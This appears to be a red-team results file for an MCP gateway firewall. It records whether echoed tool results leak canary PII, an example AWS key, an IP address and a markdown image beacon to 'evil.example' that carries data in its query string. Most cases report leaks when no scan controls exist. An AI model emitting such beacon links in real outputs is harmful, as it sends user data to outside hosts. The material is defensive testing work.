@@ -1,0 +1,503 @@
+{
+  "title": "LIVE MCP OUTPUT egress red-team \u2014 tool RESULT path batch 1 (not chat \u00a71.7)",
+  "collected_at": "2026-07-10T06:19:29.797045+00:00",
+  "workspace": "/home/contact_cyberultron_com/AI_Mesh_Firewall",
+  "surface": "gateway MCP JSON-RPC tools/call \u2192 _mcp_security_scan / _scan_tool_result_floor",
+  "not_surface": "chat OutputGuard / \u00a71.7 FirewallConfig",
+  "phase1_ref": "PHASE1_MCP_RAG_EGRESS.md F-008",
+  "auth": {
+    "control_login": "POST /api/auth/token/",
+    "user": "admin@zeroshield.io",
+    "org_slug": "zeroshield",
+    "gateway_key_source": "scripts/ralph/.mcp_scale_manifest.json (prefix matches GET /api/mcp-connector/org-gateway-key/)",
+    "gateway_key_prefix": "q9ZRfppC",
+    "servers_used": [
+      "everything-1 (tag default_scan_action)",
+      "cp09-ens8do (redact default_scan_action)"
+    ]
+  },
+  "section_17": {
+    "allow_put_rejected_soc2": true,
+    "allow_put_error": [
+      "PII output action cannot be 'allow' under SOC2."
+    ],
+    "f008_flip_to_flag_then_restore": true,
+    "restored_output_pii_action": "rewrite",
+    "config_restored_at_end": true
+  },
+  "canaries": {
+    "email": "bob.jones@corp.example",
+    "ssn": "987-65-4321",
+    "akia": "AKIAIOSFODNN7EXAMPLE",
+    "ip": "10.9.8.7",
+    "exfil_md": "![x](https://evil.example/?d=leak)",
+    "exfil_host": "evil.example"
+  },
+  "request_message_mixed": "contact bob.jones@corp.example ssn 987-65-4321 key AKIAIOSFODNN7EXAMPLE host 10.9.8.7 beacon ![x](https://evil.example/?d=leak)",
+  "method": "POST http://127.0.0.1:8300/gateway/zeroshield/mcp/{server_slug} JSON-RPC tools/call echo",
+  "sandboxes_destroyed": false,
+  "scan_controls_teardown_complete": true,
+  "findings": [
+    {
+      "id": "MCP-OG-001",
+      "severity": "HIGH",
+      "title": "Zero MCPScanControl rows \u2192 scan_skipped \u2192 raw tool RESULT egress",
+      "reproduction": [
+        "GET /api/mcp-connector/scan-controls/ \u2192 []",
+        "POST /gateway/zeroshield/mcp/everything-1 tools/call echo with email+SSN+AKIA+IP+exfil",
+        "Egress bytes contain all raw canaries",
+        "MCPEvent decision=scan_skipped reason=no_scan_controls_configured"
+      ],
+      "expected": "RESULT floor masks/blocks PII/secret/IP/exfil even without matrix rows (or secure default scan-on)",
+      "actual": "Full raw echo of all canaries; input+output scan_skipped",
+      "root_cause": "mcp_proxy._mcp_security_scan returns unscanned when enabled_info.scan_controls_configured is False; E12 floor has no findings to trigger",
+      "code": "gateway/ai_mesh_gateway/mcp_proxy.py ~1865-1887",
+      "also_on": "cp09-ens8do (default_scan_action=redact) \u2014 same skip; server default alone does NOT enable scanning"
+    },
+    {
+      "id": "MCP-OG-002",
+      "severity": "INFO",
+      "title": "F-008 CONFIRMED: \u00a71.7 does not control MCP RESULT enforcement",
+      "evidence": "With temporary org tier1 redact control: \u00a71.7 output_pii_action=flag, MCP still BLOCKED email RESULT (GDPR-PII). SOC2 rejects allow. After control delete, MCP leaks again while \u00a71.7=rewrite.",
+      "f008_confirmed": true
+    },
+    {
+      "id": "MCP-OG-003",
+      "severity": "INFO",
+      "title": "Positive control: one org MCPScanControl restores enforcement",
+      "evidence": "POST scan-controls tier1/both/redact \u2192 echo args/result BLOCK with [BLOCKED] + compliance tags; DELETE \u2192 scan_skipped LEAK returns"
+    }
+  ],
+  "matrix": [
+    {
+      "label": "baseline_echo_mixed_canaries",
+      "server_name": "Everything 1",
+      "server_slug": "everything-1",
+      "default_scan_action": "tag",
+      "transport": "stdio",
+      "http_status": 200,
+      "latency_ms": 109.4,
+      "jsonrpc_error": null,
+      "result_text": "Echo: contact bob.jones@corp.example ssn 987-65-4321 key AKIAIOSFODNN7EXAMPLE host 10.9.8.7 beacon ![x](https://evil.example/?d=leak)",
+      "raw_canaries_in_egress": {
+        "email": true,
+        "ssn": true,
+        "akia": true,
+        "ip": true,
+        "exfil_md": true,
+        "exfil_host": true
+      },
+      "marker_hits": {
+        "email_partial_mask": false,
+        "ssn_mask": false,
+        "akia_mask": false,
+        "ip_mask": false,
+        "exfil_defang": false,
+        "blocked_marker": false
+      },
+      "any_raw_pii_secret_ip": true,
+      "exfil_beacon_raw": true,
+      "verdict": "LEAK",
+      "egress_preview": "{\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"Echo: contact bob.jones@corp.example ssn 987-65-4321 key AKIAIOSFODNN7EXAMPLE host 10.9.8.7 beacon ![x](https://evil.example/?d=leak)\"}]},\"jsonrpc\":\"2.0\",\"id\":\"echo-canary-1\"}",
+      "root_cause": "no_scan_controls_configured",
+      "audit": {
+        "decision": "scan_skipped",
+        "policy_reason": "no_scan_controls_configured",
+        "compliance_tags": [],
+        "scan_findings_n": 0,
+        "metadata_scan_trace": [
+          {
+            "reason": "no_scan_controls_configured",
+            "direction": "input",
+            "scan_stage": "scan_skipped"
+          },
+          {
+            "reason": "no_scan_controls_configured",
+            "direction": "output",
+            "scan_stage": "scan_skipped"
+          }
+        ],
+        "scan_action": "tag"
+      }
+    },
+    {
+      "label": "cp09_redact_posture_echo",
+      "server_name": "cp09-ens8do",
+      "server_slug": "cp09-ens8do",
+      "default_scan_action": "redact",
+      "transport": "stdio",
+      "http_status": 200,
+      "latency_ms": 399.2,
+      "jsonrpc_error": null,
+      "result_text": "Echo: contact bob.jones@corp.example ssn 987-65-4321 key AKIAIOSFODNN7EXAMPLE host 10.9.8.7 beacon ![x](https://evil.example/?d=leak)",
+      "raw_canaries_in_egress": {
+        "email": true,
+        "ssn": true,
+        "akia": true,
+        "ip": true,
+        "exfil_md": true,
+        "exfil_host": true
+      },
+      "marker_hits": {
+        "email_partial_mask": false,
+        "ssn_mask": false,
+        "akia_mask": false,
+        "ip_mask": false,
+        "exfil_defang": false,
+        "blocked_marker": false
+      },
+      "any_raw_pii_secret_ip": true,
+      "exfil_beacon_raw": true,
+      "verdict": "LEAK",
+      "egress_preview": "{\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"Echo: contact bob.jones@corp.example ssn 987-65-4321 key AKIAIOSFODNN7EXAMPLE host 10.9.8.7 beacon ![x](https://evil.example/?d=leak)\"}]},\"jsonrpc\":\"2.0\",\"id\":\"echo-canary-cp09\"}",
+      "root_cause": "no_scan_controls_configured",
+      "audit": {
+        "decision": "scan_skipped",
+        "policy_reason": "no_scan_controls_configured",
+        "compliance_tags": [],
+        "scan_findings_n": 0,
+        "metadata_scan_trace": [
+          {
+            "reason": "no_scan_controls_configured",
+            "direction": "input",
+            "scan_stage": "scan_skipped"
+          },
+          {
+            "reason": "no_scan_controls_configured",
+            "direction": "output",
+            "scan_stage": "scan_skipped"
+          }
+        ],
+        "scan_action": "redact"
+      }
+    },
+    {
+      "label": "f008_after_17_pii_allow",
+      "server_name": "Everything 1",
+      "server_slug": "everything-1",
+      "default_scan_action": "tag",
+      "transport": "stdio",
+      "http_status": 200,
+      "latency_ms": 107.1,
+      "jsonrpc_error": null,
+      "result_text": "Echo: please echo this email: bob.jones@corp.example",
+      "raw_canaries_in_egress": {
+        "email": true,
+        "ssn": false,
+        "akia": false,
+        "ip": false,
+        "exfil_md": false,
+        "exfil_host": false
+      },
+      "marker_hits": {
+        "email_partial_mask": false,
+        "ssn_mask": false,
+        "akia_mask": false,
+        "ip_mask": false,
+        "exfil_defang": false,
+        "blocked_marker": false
+      },
+      "any_raw_pii_secret_ip": true,
+      "exfil_beacon_raw": false,
+      "verdict": "LEAK",
+      "egress_preview": "{\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"Echo: please echo this email: bob.jones@corp.example\"}]},\"jsonrpc\":\"2.0\",\"id\":\"echo-f008-after-allow\"}",
+      "section_17_output_pii_action": "flag",
+      "email_still_absent_from_egress": false,
+      "f008_confirmed": false,
+      "root_cause": "no_scan_controls_configured",
+      "audit": {
+        "decision": "scan_skipped",
+        "policy_reason": "no_scan_controls_configured",
+        "compliance_tags": [],
+        "scan_findings_n": 0,
+        "metadata_scan_trace": [
+          {
+            "reason": "no_scan_controls_configured",
+            "direction": "input",
+            "scan_stage": "scan_skipped"
+          },
+          {
+            "reason": "no_scan_controls_configured",
+            "direction": "output",
+            "scan_stage": "scan_skipped"
+          }
+        ],
+        "scan_action": "tag"
+      }
+    },
+    {
+      "label": "benign_echo_control",
+      "server_name": "Everything 1",
+      "server_slug": "everything-1",
+      "default_scan_action": "tag",
+      "transport": "stdio",
+      "http_status": 200,
+      "latency_ms": 100.7,
+      "jsonrpc_error": null,
+      "result_text": "Echo: hello-benign-mcp-rt-42",
+      "raw_canaries_in_egress": {
+        "email": false,
+        "ssn": false,
+        "akia": false,
+        "ip": false,
+        "exfil_md": false,
+        "exfil_host": false
+      },
+      "marker_hits": {
+        "email_partial_mask": false,
+        "ssn_mask": false,
+        "akia_mask": false,
+        "ip_mask": false,
+        "exfil_defang": false,
+        "blocked_marker": false
+      },
+      "any_raw_pii_secret_ip": false,
+      "exfil_beacon_raw": false,
+      "verdict": "PASS",
+      "egress_preview": "{\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"Echo: hello-benign-mcp-rt-42\"}]},\"jsonrpc\":\"2.0\",\"id\":\"echo-benign\"}"
+    },
+    {
+      "label": "with_org_tier1_redact_control",
+      "server_slug": "everything-1",
+      "http_status": 200,
+      "note": "Inbound args blocked before tool exec (compliance tags GDPR-PII); raw canaries absent from egress",
+      "result_text": "[BLOCKED] Tool 'echo' arguments matched compliance tags: GDPR-PII.",
+      "raw_canaries_in_egress": {
+        "email": false,
+        "ssn": false,
+        "akia": false,
+        "ip": false,
+        "exfil_md": false,
+        "exfil_host": false
+      },
+      "marker_hits": {
+        "blocked_marker": true
+      },
+      "any_raw_pii_secret_ip": false,
+      "verdict": "BLOCK",
+      "audit": {
+        "decision": "block",
+        "policy_reason": "pii_blocked_inbound",
+        "compliance_tags": [
+          "GDPR-PII"
+        ],
+        "scan_findings_n": 1,
+        "metadata_scan_trace": [
+          {
+            "tier": "tier1",
+            "action": "redact",
+            "key_path": "entire",
+            "direction": "input",
+            "scan_stage": "tier1",
+            "strict_mode": "fail_open",
+            "target_mode": "entire",
+            "finding_count": 1,
+            "policy_engine": true,
+            "effective_control_id": "e88fc419-b534-4dac-bb58-bbfc678627d5"
+          }
+        ],
+        "scan_action": "tag"
+      },
+      "temporary_control": {
+        "id": "e88fc419-b534-4dac-bb58-bbfc678627d5",
+        "tier": "tier1",
+        "direction": "both",
+        "action": "redact",
+        "priority": 778,
+        "teardown": "deleted"
+      }
+    },
+    {
+      "label": "f008_17_flag_mcp_still_enforces",
+      "server_slug": "everything-1",
+      "section_17_output_pii_action": "flag",
+      "result_text": "[BLOCKED] Response from 'echo' matched compliance tags: GDPR-PII.",
+      "raw_canaries_in_egress": {
+        "email": false,
+        "ssn": false,
+        "akia": false,
+        "ip": false,
+        "exfil_md": false,
+        "exfil_host": false
+      },
+      "any_raw_pii_secret_ip": false,
+      "verdict": "BLOCK",
+      "email_still_absent": true,
+      "f008_confirmed": true,
+      "note": "\u00a71.7 flipped to flag; MCP still blocked email in RESULT. SOC2 rejects allow.",
+      "audit": {
+        "decision": "block",
+        "policy_reason": "pii_blocked_outbound",
+        "compliance_tags": [
+          "GDPR-PII"
+        ],
+        "scan_findings_n": 2,
+        "metadata_scan_trace": [
+          {
+            "tier": "tier1",
+            "action": "redact",
+            "key_path": "entire",
+            "direction": "input",
+            "scan_stage": "tier1",
+            "strict_mode": "fail_open",
+            "target_mode": "entire",
+            "finding_count": 1,
+            "policy_engine": true,
+            "effective_control_id": "e88fc419-b534-4dac-bb58-bbfc678627d5"
+          },
+          {
+            "tier": "tier1",
+            "action": "redact",
+            "key_path": "entire",
+            "direction": "output",
+            "scan_stage": "tier1",
+            "strict_mode": "fail_open",
+            "target_mode": "entire",
+            "finding_count": 1,
+            "policy_engine": true,
+            "effective_control_id": "e88fc419-b534-4dac-bb58-bbfc678627d5"
+          }
+        ],
+        "scan_action": "tag"
+      }
+    },
+    {
+      "label": "after_control_teardown_expect_leak_again",
+      "server_slug": "everything-1",
+      "http_status": 200,
+      "latency_ms": 104.4,
+      "jsonrpc_error": null,
+      "result_text": "Echo: contact bob.jones@corp.example ssn 987-65-4321 key AKIAIOSFODNN7EXAMPLE host 10.9.8.7 beacon ![x](https://evil.example/?d=leak)",
+      "raw_canaries_in_egress": {
+        "email": true,
+        "ssn": true,
+        "akia": true,
+        "ip": true,
+        "exfil_md": true,
+        "exfil_host": true
+      },
+      "marker_hits": {
+        "email_partial_mask": false,
+        "ssn_mask": false,
+        "akia_mask": false,
+        "ip_mask": false,
+        "exfil_defang": false,
+        "blocked_marker": false
+      },
+      "any_raw_pii_secret_ip": true,
+      "exfil_beacon_raw": true,
+      "verdict": "LEAK",
+      "egress_preview": "{\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"Echo: contact bob.jones@corp.example ssn 987-65-4321 key AKIAIOSFODNN7EXAMPLE host 10.9.8.7 beacon ![x](https://evil.example/?d=leak)\"}]},\"jsonrpc\":\"2.0\",\"id\":\"echo-after-teardown\"}",
+      "audit": null
+    }
+  ],
+  "audits_by_request_id": {
+    "echo-canary-1": {
+      "decision": "scan_skipped",
+      "policy_reason": "no_scan_controls_configured",
+      "compliance_tags": [],
+      "scan_findings_n": 0,
+      "metadata_scan_trace": [
+        {
+          "reason": "no_scan_controls_configured",
+          "direction": "input",
+          "scan_stage": "scan_skipped"
+        },
+        {
+          "reason": "no_scan_controls_configured",
+          "direction": "output",
+          "scan_stage": "scan_skipped"
+        }
+      ],
+      "scan_action": "tag"
+    },
+    "echo-canary-cp09": {
+      "decision": "scan_skipped",
+      "policy_reason": "no_scan_controls_configured",
+      "compliance_tags": [],
+      "scan_findings_n": 0,
+      "metadata_scan_trace": [
+        {
+          "reason": "no_scan_controls_configured",
+          "direction": "input",
+          "scan_stage": "scan_skipped"
+        },
+        {
+          "reason": "no_scan_controls_configured",
+          "direction": "output",
+          "scan_stage": "scan_skipped"
+        }
+      ],
+      "scan_action": "redact"
+    },
+    "echo-with-controls-1": {
+      "decision": "block",
+      "policy_reason": "pii_blocked_inbound",
+      "compliance_tags": [
+        "GDPR-PII"
+      ],
+      "scan_findings_n": 1,
+      "metadata_scan_trace": [
+        {
+          "tier": "tier1",
+          "action": "redact",
+          "key_path": "entire",
+          "direction": "input",
+          "scan_stage": "tier1",
+          "strict_mode": "fail_open",
+          "target_mode": "entire",
+          "finding_count": 1,
+          "policy_engine": true,
+          "effective_control_id": "e88fc419-b534-4dac-bb58-bbfc678627d5"
+        }
+      ],
+      "scan_action": "tag"
+    },
+    "echo-f008-with-ctrl": {
+      "decision": "block",
+      "policy_reason": "pii_blocked_outbound",
+      "compliance_tags": [
+        "GDPR-PII"
+      ],
+      "scan_findings_n": 2,
+      "metadata_scan_trace": [
+        {
+          "tier": "tier1",
+          "action": "redact",
+          "key_path": "entire",
+          "direction": "input",
+          "scan_stage": "tier1",
+          "strict_mode": "fail_open",
+          "target_mode": "entire",
+          "finding_count": 1,
+          "policy_engine": true,
+          "effective_control_id": "e88fc419-b534-4dac-bb58-bbfc678627d5"
+        },
+        {
+          "tier": "tier1",
+          "action": "redact",
+          "key_path": "entire",
+          "direction": "output",
+          "scan_stage": "tier1",
+          "strict_mode": "fail_open",
+          "target_mode": "entire",
+          "finding_count": 1,
+          "policy_engine": true,
+          "effective_control_id": "e88fc419-b534-4dac-bb58-bbfc678627d5"
+        }
+      ],
+      "scan_action": "tag"
+    },
+    "echo-after-teardown": null
+  },
+  "summary": {
+    "baseline_without_controls": "LEAK (scan_skipped)",
+    "with_org_tier1_redact_control": "BLOCK (enforcement active)",
+    "after_teardown": "LEAK",
+    "f008_confirmed": true,
+    "allow_put_soc2_blocked": true,
+    "scan_controls_left_at_end": 0,
+    "sandboxes_destroyed": false,
+    "cases": 7
+  }
+}
